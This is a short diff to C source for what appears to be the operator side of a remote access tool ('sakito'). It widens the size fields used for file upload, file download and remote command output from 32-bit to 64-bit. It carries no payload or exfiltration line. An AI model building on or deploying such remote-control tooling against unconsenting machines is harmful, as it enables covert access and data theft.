@@ -16,6 +16,7 @@ Use this code educationally/legally.
 	#include <arpa/inet.h>
 	#include <pthread.h>
 	#include <string.h>
+	#include "headers/nbo_encoding.h"
 #endif
 
 #include <stdio.h>
@@ -166,17 +167,17 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if (sakito_tcp_send(client_socket, buf+9, cmd_len) < 1)
 		return SOCKET_ERROR;
  
-	// Receive serialized file size int32_t bytes.
-	if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) < 1)
+	// Receive serialized file size uint64_t bytes.
+	if (sakito_tcp_recv(client_socket, buf, sizeof(uint64_t)) < 1)
 		return SOCKET_ERROR;
  
 	// Deserialize file size bytes.
-	int32_t f_size = ntohl_conv(buf);
+	uint64_t f_size = ntohll_conv(buf);
 
 	// Initialize i_result to true/1
 	int i_result;
 
-	if (f_size != FAILURE) 
+	if ((long)f_size != FAILURE) 
 	{
 		// Open the file.
 		s_file file = sakito_open_file(buf+10, WRITE);
@@ -229,7 +230,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		return SOCKET_ERROR;
  
  	// Get size of file.
- 	int32_t f_size = sakito_file_size(file);
+ 	uint64_t f_size = sakito_file_size(file);
 
  	// Send file to client/upload file.
 	int i_result = sakito_send_file(client_socket, file, buf, f_size);
@@ -263,10 +264,10 @@ int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socke
 	// Receive command output stream and write output chunks to stdout.
 	while (1) 
 	{
-		if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) < 1)
+		if (sakito_tcp_recv(client_socket, buf, sizeof(uint64_t)) < 1)
 			return SOCKET_ERROR;
 
-		int32_t chunk_size = ntohl_conv(buf);
+		uint64_t chunk_size = ntohll_conv(buf);
 
 		if (chunk_size == 0)
 			break;
